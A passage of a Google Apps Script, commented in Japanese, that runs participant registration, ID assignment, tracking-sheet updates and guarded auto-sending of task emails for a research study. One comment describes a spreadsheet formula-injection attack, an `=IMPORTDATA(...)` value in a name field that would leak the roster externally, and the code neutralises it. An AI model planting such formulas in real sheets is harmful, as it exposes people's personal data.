    var problem = g1MaterialsFolderProblem_(url, pid);
    if (problem) {
      skipped.push(pid + ": " + problem);
      continue;
    }
    rows.push({ row: r, pid: pid, url: url, email: email });
  }
  return { rows: rows, skipped: skipped, error: "" };
}

/**
 * ★ 送らずに対象だけ出す（引数なし・安全）。⚠️ 実送信の前に必ず一度これを見る。
 */
function previewPendingTaskMaterials() {
  var found = g1CollectPendingMaterials_();
  if (found.error) {
    Logger.log("❌ " + found.error);
    return;
  }
  Logger.log("ℹ️ 自動送信: " + (g1AutoSendDisabled_() ? "⛔ 停止中（キルスイッチ）" : "有効"));
  Logger.log("ℹ️ G1_AUTO_SEND=" + G1_AUTO_SEND + "（false=下書き作成 / true=実送信）");
  Logger.log("ℹ️ 1 回の上限: " + G1_MATERIALS_MAX_PER_RUN + " 人");
  Logger.log("--------");
  if (!found.rows.length) {
    Logger.log("送る相手はいません（URL 未記入 or 送信済み）。");
  }
  for (var i = 0; i < found.rows.length; i++) {
    var it = found.rows[i];
    var mark = i < G1_MATERIALS_MAX_PER_RUN ? "→ 今回送る" : "… 次回に回る（上限）";
    Logger.log(mark + ": " + it.pid + " → " + g1MaskEmail_(it.email));
  }
  for (var j = 0; j < found.skipped.length; j++) {
    Logger.log("⚠️ 飛ばす " + found.skipped[j]);
  }
  Logger.log("--------");
  Logger.log("★ 実際に送るのは g1AutoSendPendingMaterials()（トリガーが自動で呼びます）。");
}

/** キルスイッチが入っているか。 */
function g1AutoSendDisabled_() {
  var v = PropertiesService.getScriptProperties().getProperty(G1_AUTOSEND_OFF_PROP);
  return !!(v && String(v).trim() !== "" && String(v).trim().toLowerCase() !== "false");
}

/**
 * ★★ 時間トリガーが呼ぶ本体（引数なし）。
 * ⚠️ 送信は取り消せない。上のガード 4 本を通ったものだけ送る。
 */
function g1AutoSendPendingMaterials() {
  if (g1AutoSendDisabled_()) {
    Logger.log("⛔ " + G1_AUTOSEND_OFF_PROP + " が立っているので送信しません。"); // ガード 1
    return;
  }

  // ⚠️★★ **排他制御が要る理由**（onG1ConsentSubmit と同じ流儀・2026-08-07 の cross-review で Codex が指摘）:
  //   「送信日が空か調べる → 送る → 送信日を書く」は **原子的ではない**。
  //   時間トリガーの実行が延びて次の発火と重なる、あるいは研究者が手で実行すると、
  //   ★ **両方が「まだ空」を見て同じ相手に 2 通送る**。⚠️ 送信は取り消せない。
  //   → 収集から記録までを丸ごとロックで囲む。取れなければ **何もしない**（次の発火で拾う）。
  var lock = LockService.getScriptLock();
  try {
    lock.waitLock(30000);
  } catch (lockErr) {
    Logger.log("⏳ 他の実行が動いているので今回は送りません（次の発火で拾います）: " + lockErr);
    return;
  }

  try {
    var found = g1CollectPendingMaterials_();
    if (found.error) {
      Logger.log("❌ " + found.error + "（送信しません）");
      return;
    }
    for (var j = 0; j < found.skipped.length; j++) {
      Logger.log("⚠️ 飛ばす " + found.skipped[j]);
    }
    if (!found.rows.length) return;

    var sh = g1RunSheet_();
    var colNote = runCol_("備考");
    var colSent = runCol_("課題ページ送付日");
    var n = Math.min(found.rows.length, G1_MATERIALS_MAX_PER_RUN); // ガード 4
    if (found.rows.length > n) {
      Logger.log("ℹ️ " + found.rows.length + " 人が対象ですが、1 回の上限 " + n + " 人まで送ります（残りは次回）。");
    }
    for (var i = 0; i < n; i++) {
      var it = found.rows[i];
      try {
        // ★ 既存関数をそのまま使う。本文の生成はあちらが持っている（二重に持たない）。
        sendTaskMaterialsEmail(it.pid, it.email, it.url);
      } catch (e) {
        // ⚠️ ★ 黙って落とさない。onG1ConsentSubmit と同じく備考に出す。
        Logger.log("❌ " + it.pid + " への事前資料メールに失敗: " + e);
        try {
          sh.getRange(it.row, colNote).setValue("⚠事前資料メール失敗-要手動送信: " + e);
        } catch (e2) {
          Logger.log("⚠️ 備考にも書けませんでした: " + e2);
        }
        continue;
      }

      // ⚠️★★ **「送れたのに記録できていない」を捕まえる**（cross-review 2026-08-07・MEDIUM）:
      //   sendTaskMaterialsEmail は送信日の書き込み失敗を try/catch で握りつぶし、
      //   Logger に出すだけで再スローしない。人が 1 件ずつ呼んでいた頃はログで気づけたが、
      //   ★ トリガー化でその人間のチェックが消えた。放置すると **次の発火で同じ人に再送**される。
      //   → 書けたことを**読み直して確かめ**、空なら自分で書く。それも駄目なら備考で可視化する。
      try {
        var mark = sh.getRange(it.row, colSent).getValue();
        if (mark === "" || mark === null || mark === undefined) {
          sh.getRange(it.row, colSent).setValue(new Date());
          SpreadsheetApp.flush();
          var again = sh.getRange(it.row, colSent).getValue();
          if (again === "" || again === null || again === undefined) {
            throw new Error("送信日を書けませんでした");
          }
          Logger.log("⚠️ " + it.pid + ": 送信日が空だったので補って書きました（★ 二重送信の芽を潰した）");
        }
      } catch (e3) {
        // ⚠️★ ここに来たら **送信済みなのに記録が無い**。次の発火で再送されるので、必ず目に付ける。
        Logger.log("❌ " + it.pid + ": ★ 送信は済んだが送信日を記録できません。⚠️ 二重送信の恐れ: " + e3);
        try {
          sh.getRange(it.row, colNote).setValue(
            "⚠★送信済だが送信日を記録できず-手で日付を入れること（放置すると再送される）: " + e3
          );
        } catch (e4) {
          Logger.log("⚠️ 備考にも書けませんでした: " + e4);
          Logger.log("★ " + G1_AUTOSEND_OFF_PROP + " を立てて自動送信を止めることを検討してください。");
        }
      }
    }
  } finally {
    lock.releaseLock();
  }
}

/** ★ 時間トリガーを 1 回だけ設置する（1 時間ごと）。 */
function installMaterialsAutoSendTrigger() {
  removeMaterialsAutoSendTriggers();
  ScriptApp.newTrigger("g1AutoSendPendingMaterials").timeBased().everyHours(1).create();
  Logger.log("✅ g1AutoSendPendingMaterials を 1 時間ごとに実行するトリガーを設置しました。");
  Logger.log("ℹ️ 止めるには Script Properties に " + G1_AUTOSEND_OFF_PROP + " を置く"
    + "（★ トリガーを消さずに止められる）か、removeMaterialsAutoSendTriggers() を実行します。");
  if (!G1_AUTO_SEND) {
    Logger.log("⚠️ ★ G1_AUTO_SEND=false なので**下書きが溜まるだけ**で被験者に届きません。");
  }
  try {
    assertRunHeader_(g1RunSheet_());
  } catch (e) {
    Logger.log("⚠️ ★ 実シートに「配布フォルダURL」列がまだありません: " + String(e.message).split("\n")[0]);
    Logger.log("   → migrateRunSheetAddUrlColumn() を先に 1 回実行してください。");
  }
}

// ============================================================
// ★★ 「G1 実施トラッキング」の自動集計（2026-08-07）
// ============================================================
// ⚠️ ★ **列のうち、これまで自動で埋まるのは 3 列だけだった**（P-ID / 課題ページ送付日 / 備考）。
//    残りは全部手入力で、⚠️ 埋め忘れると「回答は来ているのに集計に出ない」状態が静かに続く。
//
// ★ **手で入れる意味が無い列**（=どこかに真実源があり、写すだけの列）を自動で埋める:
//
//   | 列 | 真実源 | 決め方 |
//   |---|---|---|
//   | G1-C 同意           | G1-C の提出そのもの     | 提出されていれば「はい」 |
//   | G1-M 回答数(/7)     | G1-M の回答            | 被験者IDごとの**ブロック番号の異なり数** |
//   | G1-S 回答           | G1-S の回答            | 1 件でもあれば「はい」 |
//   | 完了ブロック数(/10) | 受け口に届いた `.age`   | `P0XX_blockNN_…` の**異なる NN の数** |
//   | 実施日              | 同上                   | 最も早い `.age` の `gse_YYYYMMDD` |
//
// ⚠️★ **手入力を上書きしない**: 「実施日」は空のときだけ書く（研究者の記入を尊重する）。
//    導出値（回答数・完了ブロック数）は毎回書き直す。★ そうしないと古い数字が居座る。
//
// ⚠️★★ **判定に関わる列は 1 つも触らない。** `実施形態` `撤回/除外`
//    `verify-blocks 実施` `validate_blocks 緑` `gse-dataset 送付` は**人の判断**であり、
//    機械が埋めてよいものではない（`preregistration.md §3.6` は事後除外を禁じている）。

/** 受け口 (`GSE_G1_Submit.gs` / プロジェクト B) が `.age` を貯める Drive フォルダの ID。 */
var G1_SUBMIT_FOLDER_PROP = "G1_SUBMIT_FOLDER_ID";

/** `.age` のファイル名 → {pid, block, ymd}。形が違えば null。★ 受け口の NAME_RE と同じ形。 */
function g1ParseAgeName_(name) {
  var m = String(name).match(/^([A-Za-z0-9]{1,16})_block(\d{2,3})_gse_(\d{8})_\d{6}(?:_\d{1,10})?\.age$/);
  if (!m) return null;
  return { pid: m[1].toUpperCase(), block: parseInt(m[2], 10), ymd: m[3] };
}

/**
 * 受け口フォルダを 1 周して、P-ID ごとの {blocks:Set相当, firstYmd} を作る。
 * ⚠️ フォルダ ID が未設定なら null を返す（★ 例外にしない。集計の他の列は動かしたい）。
 */
function g1CollectSubmittedBlocks_() {
  var folderId = PropertiesService.getScriptProperties().getProperty(G1_SUBMIT_FOLDER_PROP);
  if (!folderId) return null;
  var folder;
  try {
    folder = DriveApp.getFolderById(String(folderId).trim());
  } catch (e) {
    Logger.log("⚠️ " + G1_SUBMIT_FOLDER_PROP + " のフォルダを開けません: " + e);
    return null;
  }
  var out = {};
  var it = folder.getFiles();
  while (it.hasNext()) {
    var parsed = g1ParseAgeName_(it.next().getName());
    if (!parsed) continue; // ★ `.age` 以外・重複回避で付いた別名は無視する
    if (!out[parsed.pid]) out[parsed.pid] = { blocks: [], firstYmd: "" };
    var rec = out[parsed.pid];
    if (rec.blocks.indexOf(parsed.block) < 0) rec.blocks.push(parsed.block);
    if (!rec.firstYmd || parsed.ymd < rec.firstYmd) rec.firstYmd = parsed.ymd;
  }
  return out;
}

/** フォームの回答を被験者ID で束ねる。`countBy` を渡すとその設問の異なり数を数える。 */
function g1CountResponsesByPid_(formId, countBy) {
  var out = {};
  if (!formId) return out;
  var responses;
  try {
    responses = FormApp.openById(formId).getResponses();
  } catch (e) {
    Logger.log("⚠️ フォームの回答を読めません (" + formId + "): " + e);
    return out;
  }
  for (var i = 0; i < responses.length; i++) {
    var items = responses[i].getItemResponses();
    var pid = "";
    var key = "";
    for (var j = 0; j < items.length; j++) {
      var title = items[j].getItem().getTitle();
      var v = items[j].getResponse();
      var s = Array.isArray(v) ? v.join("/") : String(v == null ? "" : v);
      if (title === Q_SUBJECT_ID) pid = s.trim().toUpperCase();
      else if (countBy && title === countBy) key = s.trim();
    }
    if (!pid) continue;
    if (!out[pid]) out[pid] = [];
    // ★ countBy が無いフォーム (G1-S) は回答そのものを 1 件として数える
    var token = countBy ? key : String(i);
    if (out[pid].indexOf(token) < 0) out[pid].push(token);
  }
  return out;
}

/** `YYYYMMDD` → Date。壊れていれば null。 */
function g1YmdToDate_(ymd) {
  var m = String(ymd).match(/^(\d{4})(\d{2})(\d{2})$/);
  if (!m) return null;
  return new Date(Number(m[1]), Number(m[2]) - 1, Number(m[3]));
}

/**
 * ★★ トラッキング表の導出列を埋め直す（引数なし・トリガーからも人からも呼べる）。
 * ⚠️ ★ **判定に関わる列は触らない**（上のコメント参照）。
 */
function refreshG1RunSheet() {
  var sh = g1RunSheet_();
  if (!sh) {
    Logger.log("❌ G1 管理シートが見つかりません（buildManagementSheet() を実行）");
    return;
  }
  try {
    assertRunHeader_(sh);
  } catch (e) {
    // ⚠️ ★ ずれたまま書くと**別の列を壊す**。黙って進まない。
    Logger.log("❌ ヘッダが一致しないので集計しません: " + String(e.message).split("\n")[0]);
    return;
  }

  var submitted = g1CollectSubmittedBlocks_();
  if (submitted === null) {
    Logger.log(
      "ℹ️ " + G1_SUBMIT_FOLDER_PROP + " が未設定なので「完了ブロック数」「実施日」は飛ばします。" +
        "（受け口プロジェクトの FOLDER_ID と同じ値をここのスクリプト プロパティにも入れると埋まります）"
    );
  }
  var mcheck = g1CountResponsesByPid_(FORM_ID_MCHECK, Q_BLOCK_NO);
  var survey = g1CountResponsesByPid_(FORM_ID_SURVEY, "");

  var colPid = runCol_("P-ID");
  var colConsent = runCol_("G1-C 同意");
  var colDate = runCol_("実施日");
  var colBlocks = runCol_("完了ブロック数(/10)");
  var colM = runCol_("G1-M 回答数(/7)");
  var colS = runCol_("G1-S 回答");
  var colShort = runCol_("配布URL(短縮)");

  var last = sh.getLastRow();
  var touched = 0;
  for (var r = 3; r <= last; r++) {
    var pid = String(sh.getRange(r, colPid).getValue()).trim().toUpperCase();
    if (!pid) continue;
    var changes = [];

    // ★ 被験者に**実際に配られた**短縮 URL を見せる（2026-08-08）。
    //   ⚠️ ★ 「配布フォルダURL」の側は**生のまま**にする（G1_MATERIALS_URL_RE と
    //      g1FolderIdFromUrl_ が読む機械入力である）。短縮はこの導出列だけに置く。
    //   ⚠️ 短縮が無ければ**空のままにする**（生 URL を 2 列に重ねない）。
    var shortUrl = getShortUrl_(PropertiesService.getScriptProperties(), g1MaterialsShortKey_(pid));
    if (shortUrl && String(sh.getRange(r, colShort).getValue()).trim() !== shortUrl) {
      sh.getRange(r, colShort).setValue(shortUrl);
      changes.push("配布URL(短縮)");
    }

    // ★ G1-C 同意: この行が存在する = G1-C が提出された、である（行は提出でしか作られない）。
    if (String(sh.getRange(r, colConsent).getValue()).trim() === "") {
      sh.getRange(r, colConsent).setValue("はい");
      changes.push("G1-C 同意");
    }

    // ★ 導出値は毎回書き直す（古い数字を居座らせない）
    var m = (mcheck[pid] || []).length;
    if (String(sh.getRange(r, colM).getValue()) !== String(m)) {
      sh.getRange(r, colM).setValue(m);
      changes.push("G1-M=" + m);
    }
    var s = (survey[pid] || []).length > 0 ? "はい" : "";
    if (s && String(sh.getRange(r, colS).getValue()).trim() !== s) {
      sh.getRange(r, colS).setValue(s);
      changes.push("G1-S");
    }

    if (submitted) {
      var rec = submitted[pid];
      var nb = rec ? rec.blocks.length : 0;
      if (String(sh.getRange(r, colBlocks).getValue()) !== String(nb)) {
        sh.getRange(r, colBlocks).setValue(nb);
        changes.push("完了ブロック=" + nb);
      }
      // ⚠️ ★ 実施日は**空のときだけ**書く（研究者が入れた日付を上書きしない）
      if (rec && rec.firstYmd && String(sh.getRange(r, colDate).getValue()).trim() === "") {
        var d = g1YmdToDate_(rec.firstYmd);
        if (d) {
          sh.getRange(r, colDate).setValue(d);
          changes.push("実施日");
        }
      }
    }

    if (changes.length) {
      touched++;
      Logger.log("· " + pid + ": " + changes.join(" / "));
    }
  }
  SpreadsheetApp.flush();
  Logger.log(touched ? "✅ " + touched + " 行を更新しました。" : "✅ 更新はありません（すべて最新）。");
  Logger.log("ℹ️ ★ 実施形態 / 撤回・除外 / 検証系の列は**人の判断**なので触りません。");

  // ★ 同じ材料 (submitted / mcheck) から描けるので、ここで一緒に描き直す。
  //   ⚠️ 別トリガーにしない — 毎時トリガーが 2 本になると互いに待って遅くなる
  //   （2026-08-08 に g1AutoSendPendingMaterials と競合して実測）。
  try {
    refreshSubmissionTab_(sh.getParent());
  } catch (e) {
    // ⚠️ ★ 派生タブの失敗で**本体の集計を巻き添えにしない**（本体はもう書き終えている）。
    Logger.log("⚠️ " + SUBMIT_TAB_NAME + " の再描画に失敗しました: " + e);
  }
}

/** ★ 集計を 1 時間ごとに回す（1 回だけ実行する）。 */
function installRunSheetRefreshTrigger() {
  removeRunSheetRefreshTriggers();
  ScriptApp.newTrigger("refreshG1RunSheet").timeBased().everyHours(1).create();
  Logger.log("✅ refreshG1RunSheet を 1 時間ごとに実行するトリガーを設置しました。");
  if (!PropertiesService.getScriptProperties().getProperty(G1_SUBMIT_FOLDER_PROP)) {
    Logger.log(
      "⚠️ ★ " + G1_SUBMIT_FOLDER_PROP + " が未設定です。受け口プロジェクトの FOLDER_ID と" +
        "同じ値を入れると「完了ブロック数」「実施日」も埋まります。"
    );
  }
}

function removeRunSheetRefreshTriggers() {
  var triggers = ScriptApp.getProjectTriggers();
  var n = 0;
  for (var i = 0; i < triggers.length; i++) {
    if (triggers[i].getHandlerFunction() === "refreshG1RunSheet") {
      ScriptApp.deleteTrigger(triggers[i]);
      n++;
    }
  }
  if (n) Logger.log("🧹 既存の refreshG1RunSheet トリガを " + n + " 件削除しました");
}

function removeMaterialsAutoSendTriggers() {
  var triggers = ScriptApp.getProjectTriggers();
  var n = 0;
  for (var i = 0; i < triggers.length; i++) {
    if (triggers[i].getHandlerFunction() === "g1AutoSendPendingMaterials") {
      ScriptApp.deleteTrigger(triggers[i]);
      n++;
    }
  }
  if (n) Logger.log("🧹 既存の g1AutoSendPendingMaterials トリガを " + n + " 件削除しました");
}

// ============================================================
// ★★ G1-C の提出 → P-ID 採番 → 受付メール（Phase1 の onF1Submit と同型）
// ============================================================
// ★ **G1-C がそのまま参加登録である**（研究者判断 2026-08-03）。
//   G1-C は説明文に consent.md の内容を全部載せ、同意 8 項目・氏名・メールを取っている。
//   ⚠️ 別に「参加登録フォーム」を作るのは**重複**だった（一度作って廃止した）。
//   Phase1 も F1（スクリーニング＋同意）を募集時に使い、それをトリガーにしている。
//
// 運用:
//   1. setupG1Forms() を実行済みにする（管理シートが要る）。
//   2. installG1ConsentTrigger() を **一度だけ** 実行。
//   3. 以後、G1-C が提出されるたびに onG1ConsentSubmit(e) が自動で走る:
//      P-ID 採番（Phase1 ロスター）→ G1 実施トラッキングに行追加 → 受付メール。
//
// ⚠️ ★ 当日その場で G1-C に回答した場合も同じ経路を通る（受付メールが届くだけで害は無い）。
//    ★★ **この G1-C の回答が同意の正本である**（研究者判断 2026-08-03 = D-1(a)）。
//    ⚠️ 紙署名は廃止した。`handouts/G1_説明・同意文書.docx` は
//       **フォームが開けない機器トラブル時の予備**である（protocol.md §4.1-1）。

function installG1ConsentTrigger() {
  removeG1ConsentTriggers();
  if (!FORM_ID_CONSENT) {
    throw new Error("★ FORM_ID_CONSENT が空です。");
  }
  ScriptApp.newTrigger("onG1ConsentSubmit")
    .forForm(FormApp.openById(FORM_ID_CONSENT))
    .onFormSubmit()
    .create();
  Logger.log("✅ onG1ConsentSubmit トリガを G1-C に設定しました");
  Logger.log("ℹ️ G1_AUTO_SEND=" + G1_AUTO_SEND + "（false=下書き作成 / true=自動送信）");
  if (!G1_AUTO_SEND) {
    Logger.log(
      "⚠️ ★ G1_AUTO_SEND=false のままだと、登録されても**下書きが作られるだけ**で被験者に届きません。"
    );
  }
  if (!PHASE1_MGMT_SHEET_ID) {
    Logger.log("⚠️ ★ PHASE1_MGMT_SHEET_ID が空です。採番できないので提出時に中止されます。");
  }
}

function removeG1ConsentTriggers() {
  var triggers = ScriptApp.getProjectTriggers();
  var n = 0;
  for (var i = 0; i < triggers.length; i++) {
    if (triggers[i].getHandlerFunction() === "onG1ConsentSubmit") {
      ScriptApp.deleteTrigger(triggers[i]);
      n++;
    }
  }
  if (n) Logger.log("🧹 既存の onG1ConsentSubmit トリガを " + n + " 件削除しました");
}

// G1-C の回答を取り出す。★ 設問タイトルは Q_C_* 定数と共有する（片方だけ変えない）。
// ⚠️ 同意 8 項目はフォーム側で必須なので、ここでは検査しない（未同意の提出は原理的に来ない）。
function g1ConsentAnswers_(response) {
  var out = { name: "", email: "", pid: "" };
  var items = response.getItemResponses();
  for (var i = 0; i < items.length; i++) {
    var title = items[i].getItem().getTitle();
    var v = items[i].getResponse();
    var s = Array.isArray(v) ? v.join(" / ") : String(v == null ? "" : v);
    if (title === Q_C_NAME) out.name = s.trim();
    else if (title === Q_C_EMAIL) out.email = s.trim();
    else if (title === Q_C_PID) out.pid = s.trim().toUpperCase();
  }
  return out;
}

// ★★ G1-C の提出で走る。P-ID 採番 → トラッキング行追加 → 受付メール。
function onG1ConsentSubmit(e) {
  if (!e || !e.response) {
    Logger.log("❌ onG1ConsentSubmit: response が取得できません（トリガ経由で呼んでください）");
    return;
  }
  var a = g1ConsentAnswers_(e.response);
  if (!a.email) {
    Logger.log("⛔ G1-C 提出: メールアドレスが空のため発番しません");
    return;
  }
  if (!PHASE1_MGMT_SHEET_ID) {
    Logger.log("❌ PHASE1_MGMT_SHEET_ID が未設定。採番元が無いので中止します（回答は失われません）");
    return;
  }

  // ⚠️★★ **申告された参加者ID の形式を検証する**（code-reviewer 指摘 H2・2026-09-01）。
  //   ★ `Q_C_PID` は自由記入なので `P15` `p-015` `015` のような打ち間違いが入る。
  //   ⚠️ 旧実装はロスターに一致しないだけで**黙って「新規参加者」として扱い**、
  //     ★ メールが未登録の既存参加者に **2 つ目の P-ID を発番**しうる。
  //   → ★ 形式が違うなら**何もせず止める**（⚠️ 勝手に解釈して直さない）。
  //   ★ O1 は `Form_O1/GSE_O1_Form_Builder.gs:1495` に同じ検査がある。⚠️ G1 に無かった。
  if (a.pid && !g1IsValidPid_(a.pid)) {
    Logger.log(
      "⛔⚠️ 申告された参加者IDの形式が違います: 「" + a.pid + "」（★ 期待する形は P と数字）。\n" +
        "   ★ 発番も受付メールも行いませんでした（⚠️ 黙って新規発番しない）。\n" +
        "   ★ 研究者が本人に確認し、正しい ID で再提出してもらってください。\n" +
        "   提出者: " + g1MaskEmail_(a.email)
    );
    return;
  }

  // ★ 同時提出で同じ P-ID が 2 人に出るのを防ぐ（Phase1 と同じ）。
  // ⚠️ 2026-09-01: 手書きのロックを `g1WithRosterLock_` に寄せた。
  //   ★ `assignG1ParticipantId`（手動採番）が**同じロックを通る**ようにするため。
  var locked = g1WithRosterLock_(function () {
    var roster = SpreadsheetApp.openById(PHASE1_MGMT_SHEET_ID).getSheetByName("参加者ロスター");
    if (!roster) {
      Logger.log("❌ Phase1 の管理シートに「参加者ロスター」タブがありません（発番中止）");
      return null;
    }

    // 1) 既存の人か（★ 再提出でも再発番しない = 冪等。Phase1 参加者は既存 ID をそのまま使う）
    var found = g1FindInPhase1Roster_(roster, { pid: a.pid, email: a.email });

    // ⚠️★★★ 申告された P-ID の行に**別人のメール**が入っている（またはロスターの
    //   P-ID の形が壊れている）。★ 発番も受付メールも行わない。
    if (found && found.conflict) {
      Logger.log(
        "⛔⚠️★★★ 申告された参加者ID（" + found.pid + "・ロスター " + found.row + " 行目）に\n" +
          "   **別のメールアドレスが登録されています**（" + (found.reason || "conflict") + "）。\n" +
          "   ★ 発番も受付メールも行いませんでした。\n" +
          "   提出者: " + g1MaskEmail_(a.email) + "\n" +
          "   ★ 打ち間違いか、他人の ID の申告かを研究者が確認してください。\n" +
          "   ⚠️ 自動で新規発番はしません（★ 同じ人に 2 つの ID を作らないため）。"
      );
      // ⚠️★★ O1 は Logger だけで止めている。★ G1 では**シートにも出す** ——
      //   研究者が実行ログを見に行くまで気づけないのは silent failure と同じだから
      //   (memory `silent-success-is-not-visible` / 研究者判断 2026-09-01)。
      g1RecordRosterConflict_(found, a.email, "発番も受付メールもしていません。");
      return null;
    }

    var pid;
    var isNew = false;
    if (found) {
      // ⚠️★★★ **A 列（P-ID）が空の行**に当たることがある（★ 氏名とメールだけ先に入れた行）。
      //   ★ その場合は **appendRow へ落とさず、その行に採番して埋める**。
      //   ⚠️ 落とすと同じメールに 2 行目ができ、**1 人に 2 つの識別子**ができる
      //     —— ★ 再提出のたびに新しい P-ID と受付メールが発生する。
      //   ⚠️ O1 は `Form_O1/…:1542-1554` で直していた (2026-08-28)。★ **G1 に移植し損ねていた**
      //     (code-reviewer 指摘 H1 / security-checker MED-1・2026-09-01)。
      pid = found.pid;
      if (!pid) {
        pid = g1NextParticipantId_(roster);
        roster.getRange(found.row, 1).setValue(pid);
        isNew = true;
        Logger.log("✅ 既存行（P-ID が空）に採番して埋めました: " + pid + " 行 " + found.row);
      } else {
        Logger.log("♻️ 既存の参加者として扱います: " + pid + "（" + g1MaskEmail_(a.email) + "）");
      }
      if (!String(roster.getRange(found.row, 3).getValue()).trim()) {
        // ⚠️ 数式インジェクション対策を通す（`g1PlainText_`）。
        roster.getRange(found.row, 3).setValue(g1PlainText_(a.email));
      }
    } else {
      pid = g1NextParticipantId_(roster);
      // ⚠️★★★ **生の値を書かない。** 氏名欄は自由記入で、`=IMPORTDATA(...)` を入れられると
      //   研究者がロスターを開いた瞬間に**共用の対応表が丸ごと外部へ出る**
      //   (security-checker 指摘 HIGH-2・2026-09-01)。
      roster.appendRow([pid, g1PlainText_(a.name), g1PlainText_(a.email)]);
      isNew = true;
      Logger.log("✅ P-ID 発番: " + pid + "（" + g1MaskEmail_(a.email) + "）");
    }

    // ⚠️★★★ **重複検知は「pid が確定したあと」に 1 か所だけ置く**
    //   （cross-review 両者一致 HIGH・2026-09-01）。
    //
    //   ⚠️ 初版はこれを **`else`（新規 append）の中にだけ**書いていた。
    //     ★ その結果、**既存行の P-ID 空欄を埋める経路が素通り**していた ——
    //     `flush()` も `g1CountPidRows_()` も通らず、⚠️ **重複したまま受付メールを送った**。
    //   ★ 移植元の O1 は `Form_O1/…:1605` で **ロックの外・関数の最後に 1 回だけ**呼び、
    //     どちらの書き込み経路で確定した pid でも一律に見ている。
    //     ⚠️ 私は「新規経路にだけ」付けてしまい、**O1 のカバレッジを落として移植**していた。
    //   → ★ 分岐ごとに書かない。**確定後に 1 か所**にする（片方だけ直る事故を構造で防ぐ）。
    //
    // ⚠️★★★ 別プロジェクト（O1）との同時採番は LockService では防げない（起票 T-27）。
    //   ★ **これは「防ぐ」仕組みではなく、窓を狭めるだけ**である ——
    //     ⚠️ 読み返した**あと**に O1 が同じ P-ID を append する順序 (TOCTOU) は捕まえられない。
    //   → ★ 役割は「**気づけない状態を無くす**」ことである。
    SpreadsheetApp.flush(); // ★ ロック解放前に確定させる
    var dup = g1CountPidRows_(roster, pid);
    if (dup > 1) {
      Logger.log(
        "⛔⚠️★★★ **同じ P-ID が " + dup + " 行あります**: " + pid + "\n" +
          "   ★ 受付メールは**送っていません**（⚠️ 重複した ID を配ると回収できません ——\n" +
          "      ★ その ID で `.age` / `metrics/<PID>/` が作られ、2 人ぶんが 1 つに混ざる）。\n" +
          "   ⚠️ 別プロジェクト（O1 / Phase1）と**同時に採番された**可能性があります ——\n" +
          "      ★ LockService はスクリプト プロジェクト単位で、跨いだ排他は効きません（T-27）。\n" +
          "   ★ どちらの行を残すかは**研究者が決めてください**（⚠️ 自動では直しません）。\n" +
          "   ★ 直したあと、提出者にもう一度提出してもらえば同じ経路で受付メールが送られます。\n" +
          "   提出者: " + g1MaskEmail_(a.email)
      );
      // ⚠️★★★ **outcome を正確に書く。** 初版は固定文「発番も受付メールもしていません」で、
      //   ⚠️ この経路では**発番済み**だったため**シートに嘘が載っていた**
      //   (code-reviewer 指摘 H3)。★ 虚偽の安心は silent failure の裏返しである。
      g1RecordRosterConflict_(
        { pid: pid, row: 0, reason: "duplicate-pid-rows:" + dup },
        a.email,
        (isNew ? "⚠️ **発番は済んでいます**（" : "⚠️ **この ID を割り当て済みです**（") +
          pid + "）が、受付メールは送っていません。"
      );
      // ⚠️★★ O1 (`Form_O1/…:1621`) と同じく **ここで止める**。
      //   ★ 重複した ID を被験者に渡すと回収できない。
      return null;
    }

    // 2) G1 実施トラッキングに行を用意する（★ 実名・メールは書かない）
    var noteCell = g1EnsureRunRow_(pid);

    // 3) 受付メール。⚠️ ★ ここで例外が出ると「発番済みだが通知が無い」状態になり、
    //    再提出しても 1) で冪等スキップされるので**永久に届かない**。備考列に可視化する。
    try {
      // ★★ 2026-08-07: 課題ページのフォルダが**もう用意できていれば、この 1 通で全部渡す**。
      //    ⚠️ 用意できていなければ従来どおり 2 便に落ちる（壊れない）。
      var materials = { url: "", problem: "" };  // ⚠️ 旧名 `found` は本人確認の結果と衝突する（var は関数スコープ）
      try {
        materials = g1MaterialsUrlForPid_(pid);
      } catch (lookupErr) {
        materials = { url: "", problem: "探索に失敗: " + lookupErr };
      }
      if (materials.url) {
        Logger.log("✅ 課題ページのフォルダが見つかったので、受付メール 1 通で渡します: " + pid);
      } else {
        Logger.log("ℹ️ 課題ページは別便になります（" + materials.problem + "）");
      }
      var subject = g1RegisterAckSubject_();
      var body = g1RegisterAckBody_(pid, materials.url);
      if (G1_AUTO_SEND) {
        MailApp.sendEmail(a.email, subject, body);
        Logger.log("📧 受付メールを送信しました → " + g1MaskEmail_(a.email));
      } else {
        GmailApp.createDraft(a.email, subject, body);
        Logger.log("📝 受付メールの下書きを作成しました → " + g1MaskEmail_(a.email));
        Logger.log("   ⚠️ ★ 下書きのままでは被験者に届きません。Gmail から送信してください。");
      }
    } catch (mailErr) {
      materials = { url: "", problem: "受付メールに失敗したので記録しない" }; // ★ 下の記録を止める
      if (noteCell) noteCell.setValue("⚠受付メール未作成-要手動送信: " + mailErr);
      Logger.log("❌ 受付メールに失敗（P-ID は確定済 " + pid + "）。備考にフラグを立てました: " + mailErr);
    }
    // ⚠️★★ **受付メールで課題ページまで渡したなら、それをシートに記録する。**
    //    記録しないと `g1AutoSendPendingMaterials` が「まだ送っていない」と見なし、
    //    ★ **同じ人に事前資料メールをもう 1 通送る**（送信は取り消せない）。
    //    → 「配布フォルダURL」と「課題ページ送付日」の両方を埋めて、冪等キーを閉じる。
    if (materials.url && noteCell) {
      try {
        var sh2 = noteCell.getSheet();
        var r2 = noteCell.getRow();
        if (String(sh2.getRange(r2, runCol_("配布フォルダURL")).getValue()).trim() === "") {
          sh2.getRange(r2, runCol_("配布フォルダURL")).setValue(materials.url);
        }
        if (String(sh2.getRange(r2, runCol_("課題ページ送付日")).getValue()).trim() === "") {
          sh2.getRange(r2, runCol_("課題ページ送付日")).setValue(new Date());
        }
        SpreadsheetApp.flush();
        Logger.log("✅ 課題ページを受付メールで渡した旨を記録しました（2 通目は送られません）");
      } catch (recErr) {
        // ⚠️ ★ ここが失敗すると 2 通目が飛ぶ。**黙らせない。**
        Logger.log("❌ ★ 受付メールで渡したのに記録できませんでした。⚠️ 2 通目が送られる恐れ: " + recErr);
        try {
          noteCell.setValue("⚠★受付メールで課題ページを渡したが記録できず-手で送信日を入れること: " + recErr);
        } catch (e5) {
          Logger.log("⚠️ 備考にも書けませんでした: " + e5);
        }
      }
    }
    Logger.log(isNew ? "🎉 新規登録: " + pid : "🔁 再提出（発番なし）: " + pid);
    return pid;
  });

  // ⚠️★ `g1WithRosterLock_` はロックを取れなければ `null` を返す。★ 黙って終わらせない。
  if (locked === null) {
    Logger.log(
